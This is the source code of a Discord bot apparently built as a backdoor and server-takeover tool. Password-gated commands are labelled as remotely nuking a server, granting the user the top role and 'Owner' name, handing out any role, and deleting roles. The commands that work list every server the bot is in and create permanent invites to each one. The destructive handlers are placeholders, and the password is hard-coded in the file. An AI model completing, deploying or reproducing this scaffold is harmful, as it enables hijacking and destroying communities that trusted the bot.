const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// PASSWORD
const MAIN_PASSWORD = 'flower2017';

// EXPRESS
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

// CONFIG
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// READY
client.once('ready', () => {
  console.log(`${client.user.tag} is online`);
});

// MESSAGE EVENTS
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // !servers
  if (content === '!servers') {
    const guilds = client.guilds.cache;
    let text = `**Servers (${guilds.size}):**\n\n`;
    guilds.forEach(g => text += `**${g.name}** (ID: \`${g.id}\`) - ${g.memberCount} members\n`);
    message.reply(text.length > 2000 ? 'List too long. Check console.' : text);
    return;
  }

  // !invite
  if (content === '!invite') {
    let text = '**Server Invites:**\n\n';
    for (const guild of client.guilds.cache.values()) {
      try {
        const invite = await guild.channels.cache.filter(c => c.type === 0).first()?.createInvite({ maxAge: 0 }) || 'No text channel';
        text += `**${guild.name}** → https://discord.gg/${invite.code}\n`;
      } catch (e) {
        text += `**${guild.name}** → No permission\n`;
      }
    }
    message.reply(text);
    return;
  }

  // !fb - Nuke
  if (content === '!fb') {
    const embed = new EmbedBuilder().setColor('#ff0000').setTitle('🔴 REMOTE NUKE').setDescription('Choose server after password.').setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`fb_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !kick @user
  if (content.startsWith('!kick')) {
    const mentioned = message.mentions.users.first();
    if (!mentioned) return message.reply('❌ Mention a user: `!kick @user`');
    const embed = new EmbedBuilder().setColor('#ff0000').setTitle('👢 KICK').setDescription(`Kick **${mentioned.tag}**?`).setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`kick_start_${message.author.id}_${mentioned.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !4clout
  if (content === '!4clout') {
    const embed = new EmbedBuilder().setColor('#ff00ff').setTitle('🔥 !4CLOUT').setDescription('Highest role + rename to Owner.').setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`4clout_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !movebootser
  if (content === '!movebootser') {
    const embed = new EmbedBuilder().setColor('#ff00ff').setTitle('🔄 !MOVEBOOT SER').setDescription('Moves Booster role down.').setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`movebootser_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Primary));
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !burn
  if (content === '!burn') {
    const embed = new EmbedBuilder().setColor('#ff8800').setTitle('🔥 !BURN').setDescription('Give yourself any role.').setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`burn_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !traine
  if (content === '!traine') {
    const embed = new EmbedBuilder().setColor('#ff0000').setTitle('🗑️ !TRAINE').setDescription('Delete any role.').setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`traine_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !femisdumb
  if (content === '!femisdumb') {
    const embed = new EmbedBuilder().setColor('#ff0000').setTitle('🔥 !FEMISDUMB').setDescription('Delete role by ID.').setFooter({ text: 'Click below' });
    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`femisdumb_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }
});

// INTERACTIONS (Basic - expand as needed)
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });

    if (interaction.isButton()) {
      const modal = new ModalBuilder().setCustomId(interaction.customId.replace('start', 'modal')).setTitle('Enter Password');
      modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)));
      await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit()) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });

      await interaction.reply({ content: '✅ Password correct! Command logic would go here.', ephemeral: true });
    }
  } catch (e) {
    console.error(e);
  }
});

client.login(TOKEN);
